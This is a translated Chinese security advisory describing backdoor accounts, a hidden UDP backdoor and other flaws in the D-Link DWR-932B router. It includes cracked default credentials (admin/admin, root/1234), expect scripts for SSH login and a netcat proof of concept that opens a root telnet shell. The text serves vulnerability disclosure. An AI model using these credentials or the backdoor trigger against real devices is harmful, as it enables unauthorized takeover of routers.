# 【技术分享】Dlink DWR-932B路由器被爆多个安全漏洞
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
**前言**
根据安全研究专家的最新发现，Dlink
DWR-932B路由器中存在大量的安全漏洞，包括后门、后门账号、弱WPS、以及远程代码执行漏洞等等。如果你对物联网安全方面感兴趣的话，可以选择拿这款路由器来练练手。
**漏洞概述**
Dlink
DWR-932B路由器是一款LTE路由器，由于这款路由器的整体设计存在非常严重的问题，导致该设备中存在大量的安全漏洞。Dlink是一个跨国的网络设备制造商，而这款路由器目前已经销往了全球的多个国家和地区。需要注意的是，这款设备现在正在为多国的企业和组织提供互联网服务，所以这些漏洞必定会将相关企业置于安全风险之中。根据安全研究专家的描述，Dlink
DWR-932B路由器中的一个核心功能模块是基于Quanta LTE路由器模块来实现的。而不幸的是，该模块不仅从Quanta
LTE路由器那里继承了其通信功能，而且还将其中的安全漏洞带到了Dlink DWR-932B路由器的身上。
Dlink DWR-932B路由器中存在的安全漏洞如下所示：
> －后门账号
>
> －后门
>
> －默认WPS PIN码
>
> －弱WPS PIN码生成
>
> －泄漏No-IP账号
>
> －HTTP守护进程（qmiweb）中存在多个漏洞
>
> －远程FOTA
>
> －安全实践方案存在缺陷
>
> －UPnP安全问题
在接下来的漏洞分析测试过程中，我们使用的是最新版的官方固件(固件 DWR-932_fw_revB_2_02_eu_en_20150709.zip, 模块版本
B,
/Share3/DailyBuild/QDX_DailyBuild/QDT_2031_DLINK/QDT_2031_OS/source/LINUX/apps_proc/oe-core/build/tmp-eglibc/sysroots/x86_64-linux/usr/bin/armv7a-vfp-neon-oe-linux-gnueabi/arm-oe-linux-gnueabi-gcc)。
安全专家的观点：如果你是一个积极乐观的人，那么你可以认为这些漏洞的存在是由制造商的疏忽大意而造成的。如果你是一个阴谋论者，那么你也可以认为这些漏洞是制造商故意设计的。这篇文章并没有将所有已发现的相关漏洞披露出来，我们在这篇文章中只对其中一些影响比较严重的安全漏洞进行了分析。需要注意的是，目前这款路由器设备仍然在售。
由于制造商目前还没有向用户提供产品的安全更新补丁，所以这些漏洞目前仍然无法得到修复。如果广大用户对此有任何疑问的话，可以尝试与当地的D-Link服务点取得联系。
**漏洞细节分析－后门账号**
默认配置下，telnetd和SSHd这两个服务程序都会在路由器中运行。需要注意的是，即便是路由器设备中没有提供任何关于telnetd程序的文档和信息，这个服务程序仍然会在路由器中运行：
    user@kali:~$ cat ./etc/init.d/start_appmgr
    [...]
    #Sandro { for telnetd debug...
    start-stop-daemon -S -b -a /bin/logmaster
    #if [ -e /config2/telnetd ]; then
            start-stop-daemon -S -b -a /sbin/telnetd
    #fi
    #Sandro }
    [...]
安全研究专家在这款路由器内发现了两个后门账号，攻击者或可利用这两个后门账号来绕过路由器的HTTP身份验证机制，并获取到路由器的管理权限。
    admin@homerouter:~$ grep admin /etc/passwd
    admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
    admin@homerouter:~$
在IDA的帮助下，研究人员在“/bin/appmgr”中发现了路由器的管理员账号。设备的管理员账号默认为“admin”，而密码同样也是“admin”。
关于root用户的信息如下所示：
    user@kali:~$ cat ./etc/shadow
    root:aRDiHrJ0OkehM:16270:0:99999:7:::
    daemon:*:16270:0:99999:7:::
    bin:*:16270:0:99999:7:::
    sys:*:16270:0:99999:7:::
    sync:*:16270:0:99999:7:::
    games:*:16270:0:99999:7:::
    man:*:16270:0:99999:7:::
    lp:*:16270:0:99999:7:::
    mail:*:16270:0:99999:7:::
    news:*:16270:0:99999:7:::
    uucp:*:16270:0:99999:7:::
    proxy:*:16270:0:99999:7:::
    www-data:*:16270:0:99999:7:::
    backup:*:16270:0:99999:7:::
    list:*:16270:0:99999:7:::
    irc:*:16270:0:99999:7:::
    gnats:*:16270:0:99999:7:::
    diag:*:16270:0:99999:7:::
    nobody:*:16270:0:99999:7:::
    messagebus:!:16270:0:99999:7:::
    avahi:!:16270:0:99999:7:::
    admin@kali:~$
使用哈希破解神器John The Ripper来破解我们所获取到的密码哈希：
    user@kali:~$ john -show shadow+passwd
    admin:admin:admin:/:/bin/sh
    root:1234:16270:0:99999:7:::
    2 password hashes cracked, 0 left
    user@kali:~$
分析结果如下：
    －admin账号的密码为“admin”
    －root账号的密码为“1234”
**利用admin账号完成漏洞利用**
（代替方案，仅供参考［[传送门](https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin)］）：
    user@kali:~$ cat quanta-ssh-default-password-admin
    #!/usr/bin/expect -f
    set timeout 3
    spawn ssh admin@192.168.1.1
    expect "password: $"
    send "adminr"
    interact
    user@kali:~$ ./quanta-ssh-default-password-admin
    spawn ssh admin@192.168.1.1
    admin@192.168.1.1's password:
    admin@homerouter:~$ id
    uid=168(admin) gid=168(admin) groups=168(admin)
    admin@homerouter:~$
**利用root账号完成漏洞利用**
：（代替方案，仅供参考［[传送门](https://pierrekim.github.io/advisories/quanta-ssh-default-password-root)］）：
    user@kali:~$ cat quanta-ssh-default-password-root
    #!/usr/bin/expect -f
    set timeout 3
    spawn ssh root@192.168.1.1
    expect "password: $"
    send "1234r"
    interact
    user@kali:~$ ./quanta-ssh-default-password-root
    spawn ssh root@192.168.1.1
    root@192.168.1.1's password:
    root@homerouter:~# id
    uid=168(root) gid=168(root) groups=168(root)
    root@homerouter:~#
**漏洞细节分析－后门**
安全研究专家还发现，在“/bin/appmgr”程序中还存在一个后门程序。如果telnetd守护进程没有处于运行状态的话，攻击者可以通过向目标路由器发送一个特殊字符串（使用UDP协议）来开启一个未经身份验证的telnet服务器。
在“/bin/appmgr”中，有一个线程会持续监听0.0.0.0:39889（UDP），并等待传入控制命令。
如果某个用户向目标路由器发送了一个“HELODBG”字符串，那么路由器将会执行“/sbin/telnetd -l
/bin/sh”，并允许这名用户在未经身份验证的情况下以root用户的身份登录路由器。
在使用IDA来对程序进行分析的过程中，我们可以看到该后门存在于源程序的main函数之中（代码的第369行）：
概念验证实例（PoC）：
    user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
    Hello